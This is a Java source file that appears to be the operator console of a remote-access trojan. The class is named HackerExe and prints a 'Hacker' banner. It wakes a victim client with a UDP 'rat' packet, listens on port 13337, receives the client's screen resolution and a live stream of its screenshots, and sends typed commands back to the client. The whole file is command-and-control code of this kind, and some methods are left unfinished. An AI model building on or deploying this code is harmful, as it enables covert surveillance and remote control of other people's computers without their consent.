package hacker;

import java.awt.MouseInfo;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.nio.ByteBuffer;
import java.util.Scanner;

import javax.imageio.ImageIO;
import javax.swing.Icon;
import javax.swing.ImageIcon;

import client.FrameClientScreen;

public class HackerExe {
	private static DatagramSocket m_sock;

	private static int clientResolutionX;
	private static int clientResolutionY;

	private static int clientMousePostionX;
	private static int clientMousePostionY;
	
	
	/* Affichage */
	private static int frameWidth;
	private static int frameHeight;
	private static FrameClientScreen fcs;

	/* Réseau */
	private static final int portServeur = 13337;
	private InetSocketAddress adrDest = new InetSocketAddress(portServeur);

	private String ipClient;
	private int portClient;

	private static ServerSocket listenSocket;
	private static Socket socketConnexion;

	
	
	public static void main (String [] args) throws IOException, InterruptedException {
		HackerExe h = new HackerExe();
		System.out.println("	  _   _            _             ");
		System.out.println("	 | | | |          | |            ");
		System.out.println("	 | |_| | __ _  ___| | _____ _ __ ");
		System.out.println("	 |  _  |/ _` |/ __| |/ / _ \\ '__|");
		System.out.println("	 | | | | (_| | (__|   <  __/ |   ");
		System.out.println("	 \\_| |_/\\__,_|\\___|_|\\_\\___|_|   ");
		System.out.println("\n\t ______________________________\n");
		System.out.println("Serveur en écoute sur le port : " + portServeur);
		
		h.wakeUpClient();
		h.initListen();
		h.getClientScreenResolution();
		h.execute();
		h.forwardTelecommande();
	}
	
	
	private void wakeUpClient() throws IOException {
		DatagramSocket socket_send = new DatagramSocket(null);
		byte[] bufR = new byte[2048];
		DatagramPacket dpR = new DatagramPacket(bufR, bufR.length);
		bufR = new String("rat").getBytes();
		System.out.println("IP du Client :");
		String ipWakeUp = new Scanner(System.in).nextLine();

		dpR = new DatagramPacket(bufR, bufR.length, new InetSocketAddress(ipWakeUp, 54321));
		socket_send.send(dpR);	
	}


	private void forwardTelecommande() {
		
		/***********************************************************************/
		new Thread(new Runnable() {
		     public void run() {
		    	 
		    	 while(true) {
		    		 System.out.print("Commande : ");
		    		String lineScanned = new Scanner(System.in).nextLine();
		    		try { sendToClient( lineScanned ); } 
		    		catch (IOException e) { e.printStackTrace(); break; }
		    	 }
		     }
		}).start();
		/***********************************************************************/
	}


	private void execute() throws IOException {
		
		/***********************************************************************/
				new Thread(new Runnable() {
				     public void run() {
				    	 
				    	 while (true) {
					    	 try { printClientInterface(); } 
					    	 catch (IOException | InterruptedException e) { e.printStackTrace(); break; } 
				    	 }
				     }
				}).start();
		/**********************************************************************/
	}
			
	


	private static void printClientInterface() throws IOException, InterruptedException {
		while(true) {
			String msg = new String();
			try { msg = receiveTCP();} 
			catch (Exception e) { e.printStackTrace(); /*System.exit(0);*/ }
			
			if (msg.matches(".*ScreenSize=.*")){
			    BufferedImage img = ImageIO.read(ImageIO.createImageInputStream(socketConnexion.getInputStream()));
			    fcs.getLblImage().setIcon(new ImageIcon(img));
			}
		}
	}
	


	private void getClientScreenResolution() throws IOException {

		String msg = null;
		try { msg = receiveTCP();} 
		catch (IOException e) {e.printStackTrace();	}
		
		if (msg.matches(".*Resolution.*")) {
			String[] resolution = msg.split(":");

			clientResolutionX = Integer.parseInt(msg.substring(msg.indexOf("=")+1, msg.indexOf(":")));
			clientResolutionY = Integer.parseInt(msg.substring(msg.indexOf(":")+1, msg.length()));
			frameWidth = (2*clientResolutionX/3);
			frameHeight = (2*clientResolutionY/3);
			
			System.out.println("Resolution recue : " + frameWidth + "*" + frameHeight);
			fcs.setBounds(2000, 100, frameWidth+18, frameHeight+65);
		}

	}


	private void initListen() throws IOException {
		listenSocket = new ServerSocket();
		listenSocket.bind(adrDest);
		socketConnexion = listenSocket.accept();
		
		ipClient = socketConnexion.getInetAddress().getHostAddress();
		portClient = socketConnexion.getPort();
		
		System.out.println("Connexion de "+ ipClient +":" + portClient);
		fcs = new FrameClientScreen();
		fcs.setVisible(true);
	}

	
	public void envoyer(String msg, String adresse, int port) throws IOException {
		this.adrDest = new InetSocketAddress(adresse, port);
		byte[] bufE = msg.getBytes();
		OutputStream os = socketConnexion.getOutputStream();
		System.out.println("Message à :"+adresse+":"+port+" : "+msg.toString());
		return;
	}
	

	protected void sendToClient(String msg) throws IOException {
		DatagramSocket socket_send = new DatagramSocket(null);
		 byte[] bufR = new byte[2048];
		 DatagramPacket dpR = new DatagramPacket(bufR, bufR.length);
		 bufR = new String(msg).getBytes();
		 dpR = new DatagramPacket(bufR, bufR.length, new InetSocketAddress(ipClient, 54321));
		 socket_send.send(dpR);		
	}
	
	private static String receiveTCP() throws IOException {
		byte[] bufR = new byte[2048];
		InputStream is = socketConnexion.getInputStream();
		int lenBufR = is.read(bufR);
		String msgRecu = new String(bufR, 0 , lenBufR );
		return msgRecu;
	}
}
